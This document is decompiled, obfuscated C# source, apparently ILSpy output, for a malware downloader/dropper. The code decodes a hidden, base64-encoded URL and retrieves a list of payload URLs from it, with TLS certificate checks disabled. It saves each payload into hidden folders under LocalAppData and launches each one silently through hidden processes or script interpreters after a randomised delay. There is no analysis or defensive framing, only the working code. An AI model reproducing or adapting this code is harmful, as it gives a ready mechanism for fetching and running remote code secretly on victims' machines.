			return this._000E_2002_2001_0002();
		}
	}
}
internal interface _000E
{
	_0006 _000E_2002_2001_0002();
}
public sealed class _000E_2005 : IDisposable
{
	[Serializable]
	private sealed class _0002
	{
		public static readonly _0002 _0002 = new _0002();

		public static Func<HttpRequestMessage, X509Certificate2, X509Chain, SslPolicyErrors, bool> _000E;

		public static Func<char, bool> _0003;

		internal bool _0002(HttpRequestMessage _0002, X509Certificate2 _000E, X509Chain _0003, SslPolicyErrors _0006)
		{
			return true;
		}

		internal bool _0002(char _0002)
		{
			if (!char.IsLetterOrDigit(_0002) && _0002 != '=' && _0002 != '+')
			{
				return _0002 == '/';
			}
			return true;
		}
	}

	private sealed class _0003
	{
		[StructLayout(LayoutKind.Auto)]
		private struct _0002 : IAsyncStateMachine
		{
			public int _0002;

			public AsyncTaskMethodBuilder _000E;

			public _0003 _0003;

			private TaskAwaiter _0006;

			private TaskAwaiter<string> _000F;

			private void MoveNext()
			{
				int num = _0002;
				_0003 obj = _0003;
				try
				{
					TaskAwaiter awaiter;
					if (num != 0)
					{
						if (num == 1)
						{
							goto IL_0090;
						}
						awaiter = obj._000E._000E.WaitAsync(obj._000E._0002.m__0005.Token).GetAwaiter();
						if (!awaiter.IsCompleted)
						{
							num = (_0002 = 0);
							_0006 = awaiter;
							_000E.AwaitUnsafeOnCompleted(ref awaiter, ref this);
							return;
						}
					}
					else
					{
						awaiter = _0006;
						_0006 = default(TaskAwaiter);
						num = (_0002 = -1);
					}
					awaiter.GetResult();
					goto IL_0090;
					IL_0090:
					try
					{
						TaskAwaiter<string> awaiter2;
						if (num != 1)
						{
							awaiter2 = obj._000E._0002._0002(obj._0002).GetAwaiter();
							if (!awaiter2.IsCompleted)
							{
								num = (_0002 = 1);
								_000F = awaiter2;
								_000E.AwaitUnsafeOnCompleted(ref awaiter2, ref this);
								return;
							}
						}
						else
						{
							awaiter2 = _000F;
							_000F = default(TaskAwaiter<string>);
							num = (_0002 = -1);
						}
						string result = awaiter2.GetResult();
						if (!string.IsNullOrEmpty(result))
						{
							Dictionary<string, string> obj2 = obj._000E._0003;
							bool lockTaken = false;
							try
							{
								Monitor.Enter(obj2, ref lockTaken);
								obj._000E._0003[obj._0002] = result;
							}
							finally
							{
								if (num < 0 && lockTaken)
								{
									Monitor.Exit(obj2);
								}
							}
						}
					}
					finally
					{
						if (num < 0)
						{
							obj._000E._000E.Release();
						}
					}
				}
				catch (Exception exception)
				{
					_0002 = -2;
					_000E.SetException(exception);
					return;
				}
				_0002 = -2;
				_000E.SetResult();
			}

			void IAsyncStateMachine.MoveNext()
			{
				//ILSpy generated this explicit interface implementation from .override directive in MoveNext
				this.MoveNext();
			}

			[DebuggerHidden]
			private void SetStateMachine(IAsyncStateMachine _0002)
			{
				_000E.SetStateMachine(_0002);
			}

			void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine _0002)
			{
				//ILSpy generated this explicit interface implementation from .override directive in SetStateMachine
				this.SetStateMachine(_0002);
			}
		}

		public string _0002;

		public _000E _000E;

		internal async Task _0002()
		{
			await _000E._000E.WaitAsync(_000E._0002.m__0005.Token);
			try
			{
				string value = await _000E._0002._0002(this._0002);
				if (!string.IsNullOrEmpty(value))
				{
					lock (_000E._0003)
					{
						_000E._0003[this._0002] = value;
						return;
					}
				}
			}
			finally
			{
				_000E._000E.Release();
			}
		}
	}

	[StructLayout(LayoutKind.Auto)]
	private struct _0005 : IAsyncStateMachine
	{
		public int _0002;

		public AsyncTaskMethodBuilder<bool> _000E;

		public Dictionary<string, string> _0003;

		private bool _0006;

		private Dictionary<string, string>.ValueCollection.Enumerator _000F;

		private TaskAwaiter _0005;

		private void MoveNext()
		{
			int num = _0002;
			bool result;
			try
			{
				if ((uint)num > 3u)
				{
					_0006 = false;
					_000F = _0003.Values.GetEnumerator();
				}
				try
				{
					if ((uint)num <= 3u)
					{
						goto IL_005d;
					}
					goto IL_03c8;
					IL_03c8:
					string current = default(string);
					string text = default(string);
					while (_000F.MoveNext())
					{
						current = _000F.Current;
						if (!File.Exists(current))
						{
							continue;
						}
						text = Path.GetExtension(current)?.ToLower();
						goto IL_005d;
					}
					goto end_IL_0029;
					IL_005d:
					try
					{
						TaskAwaiter awaiter;
						switch (num)
						{
						default:
							if (text == _0002_0015._0002(1787740118) || text == _0002_0015._0002(1787740073))
							{
								Process.Start(new ProcessStartInfo
								{
									FileName = current,
									WorkingDirectory = Path.GetDirectoryName(current),
									WindowStyle = ProcessWindowStyle.Hidden,
									CreateNoWindow = true,
									UseShellExecute = false
								});
								_0006 = true;
								awaiter = Task.Delay(1000).GetAwaiter();
								if (!awaiter.IsCompleted)
								{
									num = (_0002 = 0);
									_0005 = awaiter;
									_000E.AwaitUnsafeOnCompleted(ref awaiter, ref this);
									return;
								}
								goto IL_012c;
							}
							if (text == _0002_0015._0002(1787740092) || text == _0002_0015._0002(1787740087))
							{
								Process.Start(new ProcessStartInfo
								{
									FileName = _0002_0015._0002(1787740042),
									Arguments = _0002_0015._0002(1787740056) + current + _0002_0015._0002(1787740051),
									WindowStyle = ProcessWindowStyle.Hidden,
									CreateNoWindow = true,
									UseShellExecute = false
								});
								_0006 = true;
								awaiter = Task.Delay(500).GetAwaiter();
								if (!awaiter.IsCompleted)
								{
									num = (_0002 = 1);
									_0005 = awaiter;
									_000E.AwaitUnsafeOnCompleted(ref awaiter, ref this);
									return;
								}
								goto IL_020e;
							}
							if (text == _0002_0015._0002(1787740011))
							{
								Process.Start(new ProcessStartInfo
								{
									FileName = _0002_0015._0002(1787740030),
									Arguments = _0002_0015._0002(1787739979) + current + _0002_0015._0002(1787740051),
									WindowStyle = ProcessWindowStyle.Hidden,
									CreateNoWindow = true,
									UseShellExecute = false
								});
								_0006 = true;
								awaiter = Task.Delay(500).GetAwaiter();
								if (!awaiter.IsCompleted)
								{
									num = (_0002 = 2);
									_0005 = awaiter;
									_000E.AwaitUnsafeOnCompleted(ref awaiter, ref this);
									return;
								}
								goto IL_02de;
							}
							if (text == _0002_0015._0002(1787739917) || text == _0002_0015._0002(1787739904) || text == _0002_0015._0002(1787739924) || text == _0002_0015._0002(1787739887) || text == _0002_0015._0002(1787739874))
							{
								Process.Start(new ProcessStartInfo
								{
									FileName = current,
									UseShellExecute = true
								});
								_0006 = true;
								awaiter = Task.Delay(200).GetAwaiter();
								if (!awaiter.IsCompleted)
								{
									num = (_0002 = 3);
									_0005 = awaiter;
									_000E.AwaitUnsafeOnCompleted(ref awaiter, ref this);
									return;
								}
								break;
							}
							goto end_IL_005d;
						case 0:
							awaiter = _0005;
							_0005 = default(TaskAwaiter);
							num = (_0002 = -1);
							goto IL_012c;
						case 1:
							awaiter = _0005;
							_0005 = default(TaskAwaiter);
							num = (_0002 = -1);
							goto IL_020e;
						case 2:
							awaiter = _0005;
							_0005 = default(TaskAwaiter);
							num = (_0002 = -1);
							goto IL_02de;
						case 3:
							{
								awaiter = _0005;
								_0005 = default(TaskAwaiter);
								num = (_0002 = -1);
								break;
							}
							IL_02de:
							awaiter.GetResult();
							goto end_IL_005d;
							IL_020e:
							awaiter.GetResult();
							goto end_IL_005d;
							IL_012c:
							awaiter.GetResult();
							goto end_IL_005d;
						}
						awaiter.GetResult();
						end_IL_005d:;
					}
					catch
					{
					}
					goto IL_03c8;
					end_IL_0029:;
				}
				finally
				{
					if (num < 0)
					{
						((IDisposable)_000F/*cast due to .constrained prefix*/).Dispose();
					}
				}
				_000F = default(Dictionary<string, string>.ValueCollection.Enumerator);
				result = _0006;
			}
			catch (Exception exception)
			{
				_0002 = -2;
				_000E.SetException(exception);
				return;
			}
			_0002 = -2;
			_000E.SetResult(result);
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerHidden]
		private void SetStateMachine(IAsyncStateMachine _0002)
		{
			_000E.SetStateMachine(_0002);
		}

		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in SetStateMachine
			this.SetStateMachine(_0002);
		}
	}

	[StructLayout(LayoutKind.Auto)]
	private struct _0006 : IAsyncStateMachine
	{
		public int _0002;

		public AsyncTaskMethodBuilder<string> _000E;

		public string _0003;

		public _000E_2005 _0006;

		private string _000F;

		private HttpResponseMessage _0005;

		private TaskAwaiter<HttpResponseMessage> _0008;

		private TaskAwaiter<byte[]> _0002_2005;

		private void MoveNext()
		{
			int num = _0002;
			_000E_2005 obj = _0006;
			string result3;
			try
			{
				try
				{
					TaskAwaiter<HttpResponseMessage> awaiter;
					if (num != 0)
					{
						if (num == 1)
						{
							goto IL_00ee;
						}
						string text = Path.GetFileName(new Uri(_0003).LocalPath);
						if (string.IsNullOrEmpty(text))
						{
							text = string.Format(_0002_0015._0002(1787740131), DateTime.Now.Ticks);
						}
						_000F = Path.Combine(obj.m__000E, text);
						awaiter = obj.m__0002.GetAsync(_0003, (HttpCompletionOption)1, obj.m__0005.Token).GetAwaiter();
						if (!awaiter.IsCompleted)
						{
							num = (_0002 = 0);
							_0008 = awaiter;
							_000E.AwaitUnsafeOnCompleted(ref awaiter, ref this);
							return;
						}
					}
					else
					{
						awaiter = _0008;
						_0008 = default(TaskAwaiter<HttpResponseMessage>);
						num = (_0002 = -1);
					}
					HttpResponseMessage result = awaiter.GetResult();
					_0005 = result;
					goto IL_00ee;
					IL_00ee:
					try
					{
						TaskAwaiter<byte[]> awaiter2;
						if (num != 1)
						{
							_0005.EnsureSuccessStatusCode();
							awaiter2 = _0005.Content.ReadAsByteArrayAsync().GetAwaiter();
							if (!awaiter2.IsCompleted)
							{
								num = (_0002 = 1);
								_0002_2005 = awaiter2;
								_000E.AwaitUnsafeOnCompleted(ref awaiter2, ref this);
								return;
							}
						}
						else
						{
							awaiter2 = _0002_2005;
							_0002_2005 = default(TaskAwaiter<byte[]>);
							num = (_0002 = -1);
						}
						byte[] result2 = awaiter2.GetResult();
						File.WriteAllBytes(_000F, result2);
						if (!File.Exists(_000F) || new FileInfo(_000F).Length <= 0)
						{
							goto end_IL_00ee;
						}
						File.SetAttributes(_000F, FileAttributes.Hidden);
						result3 = _000F;
						goto end_IL_000e;
						end_IL_00ee:;
					}
					finally
					{
						if (num < 0 && _0005 != null)
						{
							((IDisposable)_0005).Dispose();
						}
					}
					_0005 = null;
					_000F = null;
					goto IL_01d8;
					end_IL_000e:;
				}
				catch
				{
					goto IL_01d8;
				}
				goto end_IL_000e_2;
				IL_01d8:
				result3 = null;
				end_IL_000e_2:;
			}
			catch (Exception exception)
			{
				_0002 = -2;
				_000E.SetException(exception);
				return;
			}
			_0002 = -2;
			_000E.SetResult(result3);
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerHidden]
		private void SetStateMachine(IAsyncStateMachine _0002)
		{
			_000E.SetStateMachine(_0002);
		}

		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in SetStateMachine
			this.SetStateMachine(_0002);
		}
	}

	[StructLayout(LayoutKind.Auto)]
	private struct _0008 : IAsyncStateMachine
	{
		public int _0002;

		public AsyncTaskMethodBuilder<bool> _000E;

		public _000E_2005 _0003;

		private _000E _0006;

		private TaskAwaiter _000F;

		private TaskAwaiter<List<string>> _0005;

		private TaskAwaiter<bool> _0008;

		private void MoveNext()
		{
			int num = _0002;
			_000E_2005 obj = _0003;
			bool result;
			try
			{
				TaskAwaiter awaiter;
				if (num != 0)
				{
					if ((uint)(num - 1) <= 2u)
					{
						goto IL_00b4;
					}
					_0006 = new _000E();
					_0006._0002 = _0003;
					awaiter = Task.Delay(global::_000E_2005.m__0003.Next(500, 2000)).GetAwaiter();
					if (!awaiter.IsCompleted)
					{
						num = (_0002 = 0);
						_000F = awaiter;
						_000E.AwaitUnsafeOnCompleted(ref awaiter, ref this);
						return;
					}
				}
				else
				{
					awaiter = _000F;
					_000F = default(TaskAwaiter);
					num = (_0002 = -1);
				}
				awaiter.GetResult();
				if (!obj._0002())
				{
					goto IL_00b4;
				}
				result = false;
				goto end_IL_000e;
				IL_00b4:
				try
				{
					TaskAwaiter<List<string>> awaiter3;
					TaskAwaiter<bool> awaiter2;
					List<string> result2;
					switch (num)
					{
					default:
					{
						string text = obj._000E();
						if (!string.IsNullOrEmpty(text))
						{
							awaiter3 = obj._0002(text).GetAwaiter();
							if (!awaiter3.IsCompleted)
							{
								num = (_0002 = 1);
								_0005 = awaiter3;
								_000E.AwaitUnsafeOnCompleted(ref awaiter3, ref this);
								return;
							}
							goto IL_0139;
						}
						result = false;
						goto end_IL_00b4;
					}
					case 1:
						awaiter3 = _0005;
						_0005 = default(TaskAwaiter<List<string>>);
						num = (_0002 = -1);
						goto IL_0139;
					case 2:
						awaiter = _000F;
						_000F = default(TaskAwaiter);
						num = (_0002 = -1);
						goto IL_01e7;
					case 3:
						{
							awaiter2 = _0008;
							_0008 = default(TaskAwaiter<bool>);
							num = (_0002 = -1);
							break;
						}
						IL_01e7:
						awaiter.GetResult();
						if (_0006._0003.Count != 0)
						{
							awaiter2 = obj._0002(_0006._0003).GetAwaiter();
							if (!awaiter2.IsCompleted)
							{
								num = (_0002 = 3);
								_0008 = awaiter2;
								_000E.AwaitUnsafeOnCompleted(ref awaiter2, ref this);
								return;
							}
							break;
						}
						result = false;
						goto end_IL_00b4;
						IL_0139:
						result2 = awaiter3.GetResult();
						if (result2 != null && result2.Count != 0)
						{
							_0006._0003 = new Dictionary<string, string>();
							_0006._000E = new SemaphoreSlim(5);
							awaiter = Task.WhenAll(result2.Select(_0006._0002).ToList()).GetAwaiter();
							if (!awaiter.IsCompleted)
							{
								num = (_0002 = 2);
								_000F = awaiter;
								_000E.AwaitUnsafeOnCompleted(ref awaiter, ref this);
								return;
							}
							goto IL_01e7;
						}
						result = false;
						goto end_IL_00b4;
					}
					result = awaiter2.GetResult();
					end_IL_00b4:;
				}
				catch
				{
					result = false;
				}
				end_IL_000e:;
			}
			catch (Exception exception)
			{
				_0002 = -2;
				_0006 = null;
				_000E.SetException(exception);
				return;
			}
			_0002 = -2;
			_0006 = null;
			_000E.SetResult(result);
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerHidden]
		private void SetStateMachine(IAsyncStateMachine _0002)
		{
			_000E.SetStateMachine(_0002);
		}

		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in SetStateMachine
			this.SetStateMachine(_0002);
		}
	}

	private sealed class _000E
	{
		public _000E_2005 _0002;

		public SemaphoreSlim _000E;

		public Dictionary<string, string> _0003;

		internal Task _0002(string _0002)
		{
			return Task.Run((Func<Task?>)new _0003
			{
				_000E = this,
				_0002 = _0002
			}._0002);
		}
	}

	[StructLayout(LayoutKind.Auto)]
	private struct _000F : IAsyncStateMachine
	{
		public int _0002;

		public AsyncTaskMethodBuilder<List<string>> _000E;

		public string _0003;

		public _000E_2005 _0006;

		private HttpRequestMessage _000F;

		private HttpResponseMessage _0005;

		private TaskAwaiter<HttpResponseMessage> _0008;

		private TaskAwaiter<string> _0002_2005;

		private void MoveNext()
		{
			//IL_001e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0028: Expected O, but got Unknown
			int num = _0002;
			_000E_2005 obj = _0006;
			List<string> result3;
			try
			{
				try
				{
					if ((uint)num > 1u)
					{
						_000F = new HttpRequestMessage(HttpMethod.Get, _0003);
					}
					try
					{
						TaskAwaiter<HttpResponseMessage> awaiter;
						if (num != 0)
						{
							if (num == 1)
							{
								goto IL_00d6;
							}
							((HttpHeaders)_000F.Headers).Add(_0002_0015._0002(1787740144), _0002_0015._0002(1787740101));
							awaiter = ((HttpMessageInvoker)obj.m__0002).SendAsync(_000F, obj.m__0005.Token).GetAwaiter();
							if (!awaiter.IsCompleted)
							{
								num = (_0002 = 0);
								_0008 = awaiter;
								_000E.AwaitUnsafeOnCompleted(ref awaiter, ref this);
								return;
							}
						}
						else
						{
							awaiter = _0008;
							_0008 = default(TaskAwaiter<HttpResponseMessage>);
							num = (_0002 = -1);
						}
						HttpResponseMessage result = awaiter.GetResult();
						_0005 = result;
						goto IL_00d6;
						IL_00d6:
						try
						{
							TaskAwaiter<string> awaiter2;
							if (num == 1)
							{
								awaiter2 = _0002_2005;
								_0002_2005 = default(TaskAwaiter<string>);
								num = (_0002 = -1);
								goto IL_014b;
							}
							if (_0005.IsSuccessStatusCode)
							{
								awaiter2 = _0005.Content.ReadAsStringAsync().GetAwaiter();
								if (!awaiter2.IsCompleted)
								{
									num = (_0002 = 1);
									_0002_2005 = awaiter2;
									_000E.AwaitUnsafeOnCompleted(ref awaiter2, ref this);
									return;
								}
								goto IL_014b;
							}
							goto end_IL_00d6;
							IL_014b:
							string result2 = awaiter2.GetResult();
							List<string> list = new List<string>();
							string[] array = result2.Split(new char[2] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
							for (int i = 0; i < array.Length; i++)
							{
								string text = array[i].Trim();
								if (Uri.IsWellFormedUriString(text, UriKind.Absolute))
								{
									list.Add(text);
								}
							}
							result3 = list;
							goto end_IL_0029;
							end_IL_00d6:;
						}
						finally
						{
							if (num < 0 && _0005 != null)
							{
								((IDisposable)_0005).Dispose();
							}
						}
						_0005 = null;
						goto IL_01de;
						end_IL_0029:;
					}
					finally
					{
						if (num < 0 && _000F != null)
						{
							((IDisposable)_000F).Dispose();
						}
					}
					goto end_IL_000e;
					IL_01de:
					_000F = null;
					goto IL_01ea;
					end_IL_000e:;
				}
				catch
				{
					goto IL_01ea;
				}
				goto end_IL_000e_2;
				IL_01ea:
				result3 = new List<string>();
				end_IL_000e_2:;
			}
			catch (Exception exception)
			{
				_0002 = -2;
				_000E.SetException(exception);
				return;
			}
			_0002 = -2;
			_000E.SetResult(result3);
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerHidden]
		private void SetStateMachine(IAsyncStateMachine _0002)
		{
			_000E.SetStateMachine(_0002);
		}

		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in SetStateMachine
			this.SetStateMachine(_0002);
		}
	}

	private HttpClient m__0002;

	private string m__000E;

	private static readonly Random m__0003 = new Random();

	private readonly object m__0006 = new object();

	private bool m__000F;

	private readonly CancellationTokenSource m__0005 = new CancellationTokenSource();

	private readonly SemaphoreSlim m__0008 = new SemaphoreSlim(1, 1);

	private readonly List<IDisposable> _0002_2005 = new List<IDisposable>();

	private readonly string m__000E_2005;

	private readonly string _0003_2005;

	public _000E_2005()
	{
		m__000E_2005 = Process.GetCurrentProcess().MainModule.FileName;
		_0003_2005 = Path.Combine(Path.GetTempPath(), string.Format(_0002_0015._0002(1787739893), Guid.NewGuid()));
		_0002();
	}

	private void _0002()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Expected O, but got Unknown
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		ServicePointManager.DefaultConnectionLimit = 10;
		HttpClientHandler val = new HttpClientHandler
		{
			AutomaticDecompression = (DecompressionMethods.GZip | DecompressionMethods.Deflate),
			UseCookies = false,
			ServerCertificateCustomValidationCallback = global::_000E_2005._0002._0002._0002
		};
		this.m__0002 = new HttpClient((HttpMessageHandler)(object)val)
		{
			Timeout = TimeSpan.FromSeconds(45.0)
		};
		this.m__0002.DefaultRequestHeaders.UserAgent.ParseAdd(_0002_0015._0002(1787739841));
		((HttpHeaders)this.m__0002.DefaultRequestHeaders).Add(_0002_0015._0002(1787739804), _0002_0015._0002(1787739754));
		((HttpHeaders)this.m__0002.DefaultRequestHeaders).Add(_0002_0015._0002(1787739766), _0002_0015._0002(1787739740));
		((HttpHeaders)this.m__0002.DefaultRequestHeaders).Add(_0002_0015._0002(1787739689), _0002_0015._0002(1787739706));
		((HttpHeaders)this.m__0002.DefaultRequestHeaders).Add(_0002_0015._0002(1787739659), _0002_0015._0002(1787739671));
		this.m__000E = _0002();
	}

	private string _0002()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		string text = Path.Combine(folderPath, _0002_0015._0002(1787739622), _0002_0015._0002(1787739638), _0002_0015._0002(1787739588), _0002_0015._0002(1787739604), string.Format(_0002_0015._0002(1787739561), DateTime.Now, Guid.NewGuid().ToString().Substring(0, 4)));
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
			File.SetAttributes(text, FileAttributes.Hidden);
		}
		string[] array = new string[5]
		{
			_0002_0015._0002(1787739530),
			_0002_0015._0002(1787739550),
			_0002_0015._0002(1787739537),
			_0002_0015._0002(1787739492),
			_0002_0015._0002(1787739515)
		};
		foreach (string path in array)
		{
			string path2 = Path.Combine(text, path);
			if (!Directory.Exists(path2))
			{
				Directory.CreateDirectory(path2);
				File.SetAttributes(path2, FileAttributes.Hidden);
			}
		}
		return text;
	}

	private bool _0002()
	{
		return false;
	}

	public async Task<bool> _0002()
	{
		_000E obj = new _000E
		{
			_0002 = this
		};
		await Task.Delay(global::_000E_2005.m__0003.Next(500, 2000));
		if (_0002())
		{
			return false;
		}
		try
		{
			string text = _000E();
			if (string.IsNullOrEmpty(text))
			{
				return false;
			}
			List<string> list = await _0002(text);
			if (list == null || list.Count == 0)
			{
				return false;
			}
			obj._0003 = new Dictionary<string, string>();
			obj._000E = new SemaphoreSlim(5);
			await Task.WhenAll(list.Select(obj._0002).ToList());
			if (obj._0003.Count == 0)
			{
				return false;
			}
			return await _0002(obj._0003);
		}
		catch
		{
			return false;
		}
	}

	private string _000E()
	{
		try
		{
			byte[] bytes = Convert.FromBase64String(_0002_0015._0002(1787739467));
			string text = Encoding.UTF8.GetString(bytes);
			if (text.Length % 4 == 0 && text.All(global::_000E_2005._0002._0002._0002))
			{
				try
				{
					byte[] bytes2 = Convert.FromBase64String(text);
					text = Encoding.UTF8.GetString(bytes2);
				}
				catch
				{
				}
			}
			return text;
		}
		catch
		{
			return null;
		}
	}

	private async Task<List<string>> _0002(string _0002)
	{
		try
		{
			HttpRequestMessage val = new HttpRequestMessage(HttpMethod.Get, _0002);
			try
			{
				((HttpHeaders)val.Headers).Add(_0002_0015._0002(1787740144), _0002_0015._0002(1787740101));
				HttpResponseMessage val2 = await ((HttpMessageInvoker)this.m__0002).SendAsync(val, this.m__0005.Token);
				try
				{
					if (val2.IsSuccessStatusCode)
					{
						string obj = await val2.Content.ReadAsStringAsync();
						List<string> list = new List<string>();
						string[] array = obj.Split(new char[2] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
						for (int i = 0; i < array.Length; i++)
						{
							string text = array[i].Trim();
							if (Uri.IsWellFormedUriString(text, UriKind.Absolute))
							{
								list.Add(text);
							}
						}
						return list;
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return new List<string>();
	}

	private async Task<string> _0002(string _0002)
	{
		try
		{
			string text = Path.GetFileName(new Uri(_0002).LocalPath);
			if (string.IsNullOrEmpty(text))
			{
				text = string.Format(_0002_0015._0002(1787740131), DateTime.Now.Ticks);
			}
			string text2 = Path.Combine(this.m__000E, text);
			HttpResponseMessage val = await this.m__0002.GetAsync(_0002, (HttpCompletionOption)1, this.m__0005.Token);
			try
			{
				val.EnsureSuccessStatusCode();
				File.WriteAllBytes(text2, await val.Content.ReadAsByteArrayAsync());
				if (File.Exists(text2) && new FileInfo(text2).Length > 0)
				{
					File.SetAttributes(text2, FileAttributes.Hidden);
					return text2;
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return null;
	}

	private async Task<bool> _0002(Dictionary<string, string> _0002)
	{
		bool result = false;
		foreach (string value in _0002.Values)
		{
			if (!File.Exists(value))
			{
				continue;
			}
			string text = Path.GetExtension(value)?.ToLower();
			try
			{
				if (text == _0002_0015._0002(1787740118) || text == _0002_0015._0002(1787740073))
				{
					Process.Start(new ProcessStartInfo
					{
						FileName = value,
						WorkingDirectory = Path.GetDirectoryName(value),
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true,
						UseShellExecute = false
					});
					result = true;
					await Task.Delay(1000);
				}
				else if (text == _0002_0015._0002(1787740092) || text == _0002_0015._0002(1787740087))
				{
					Process.Start(new ProcessStartInfo
					{
						FileName = _0002_0015._0002(1787740042),
						Arguments = _0002_0015._0002(1787740056) + value + _0002_0015._0002(1787740051),
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true,
						UseShellExecute = false
					});
					result = true;
					await Task.Delay(500);
				}
				else if (text == _0002_0015._0002(1787740011))
				{
					Process.Start(new ProcessStartInfo
					{
						FileName = _0002_0015._0002(1787740030),
						Arguments = _0002_0015._0002(1787739979) + value + _0002_0015._0002(1787740051),
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true,
						UseShellExecute = false
					});
					result = true;
					await Task.Delay(500);
				}
				else if (text == _0002_0015._0002(1787739917) || text == _0002_0015._0002(1787739904) || text == _0002_0015._0002(1787739924) || text == _0002_0015._0002(1787739887) || text == _0002_0015._0002(1787739874))
				{
					Process.Start(new ProcessStartInfo
					{
						FileName = value,
						UseShellExecute = true
					});
					result = true;
					await Task.Delay(200);
				}
			}
			catch
			{
			}
		}
		return result;
	}

	public void Dispose()
	{
		_000E_2005_2002_2001_0002(_0002: true);
		GC.SuppressFinalize(this);
	}

	protected virtual void _000E_2005_2002_2001_0002(bool _0002)
	{
		if (this.m__000F)
		{
			return;
		}
		if (_0002)
		{
			this.m__0005?.Cancel();
			this.m__0005?.Dispose();
			this.m__0008?.Dispose();
			HttpClient obj = this.m__0002;
			if (obj != null)
			{
				((HttpMessageInvoker)obj).Dispose();
			}
			foreach (IDisposable item in _0002_2005)
			{
				try
				{
					item?.Dispose();
				}
				catch
				{
				}
			}
			_0002_2005.Clear();
			try
			{
				if (File.Exists(_0003_2005))
				{
					File.Delete(_0003_2005);
				}
			}
			catch
			{
			}
		}
		this.m__000F = true;
	}
}
internal interface _000F
{
	void _000F_2002_2001_0002();
}
internal static class _000F_2005
{
}
